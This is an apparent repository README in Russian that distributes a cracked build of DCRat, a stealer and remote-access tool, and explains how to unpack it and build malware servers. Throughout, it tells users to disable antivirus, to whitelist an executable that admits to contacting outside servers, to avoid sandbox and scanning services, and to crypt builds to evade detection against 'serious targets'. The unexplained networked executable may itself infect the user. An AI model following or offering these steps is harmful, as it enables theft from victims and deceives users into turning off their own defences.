# KryakDCRataL1nc0In
Всем привет. Решил выложить в свободный доступ немного доработанную версию известного стиллера/софта DCRat. Оригинальный кряк делал товарищ L1nc0In, но, как вы знаете, после его ухода оригинальная сборка работала с ошибками и билды были пипец кривые.
Я взял его исходник, почистил мусор, поправил зависимости и немного допилил билдер, чтобы сервера нормально компилились и не крашились.

Как скачать/распаковать:

1) Скачиваем все файлы из репозитория
2) Открываем .zip файлик в WinRAR (файлы .z01-.z02 должны быть рядом с .zip файлом)
3) Распаковываем в любое место

Важные условия для РАБОЧЕЙ сборки:

Поля Name и Cache: Огромная просьба — при создании сервера в поле Name и в обоих полях Cache вписать "L1nc0In" (без кавычек). Это стринговая привязка к оригинальному автору, зашитая в ядре. Если написать что-то другое или оставить поля пустыми, билдер просто не соберет файл или соберет битый сервер, который не будет стучаться на панель.

Файл dcrat_updservice.exe (!ВАЖНО!):
В папке с билдером лежит файл dcrat_updservice.exe. Удалять его категорически нельзя — это часть обновленной архитектуры, отвечающая за инжект и поддержание связи с панелью управления. DCRat спроектирован так, что без этого файла сам DCRat.exe не станет запускаться.
Если ваш антивирус ругается на этот файл: Это нормально и неизбежно. Файл пытается стучаться на CDN-сервера и IP-адреса, которые когда-то использовались оригинальным DCRat. Большая часть из них уже мертва, поэтому для системы это выглядит подозрительно. Просто добавьте папку с билдом и файл dcrat_updservice.exe в исключения антивируса.

Как билдить:

1) Отключаем Защитник/Авиру (он сожрет updservice).
2) Открываем билдер.
3) Вбиваем свои данные (ссылка которая была выдана install.php).
4) Нажимаем на кнопочку

ПРО install.php !!!В полях Name и Cache ставим L1nc0In. а иначе билд не будет работать. Циферки во вкладке cache не трогаем!!!

Жмем билд. (НЕ ЛЕЙ БИЛД НА ВИРУСТОТАЛ ИЛИ АНИ.РАН А ИНАЧЕ ТВОЯ ПАНЕЛЬКА ОТЛЕТИТ ЗА АБУЗ)

Готовый сервер закиньте в нужную папку (Выбор при создании). Не забывайте про крипт так как стандартный легко обходится и можно украсть ваш C2 адрес панельки с паролем, криптуйте чем нибудь нормальным если целитесь в серьезные цели.

P.S. Если антивирус ругается на updservice, напоминаю — это ложное срабатывание из-за попыток коннекта к старым серверам. Без него софт нерабочий, так что не удаляйте.
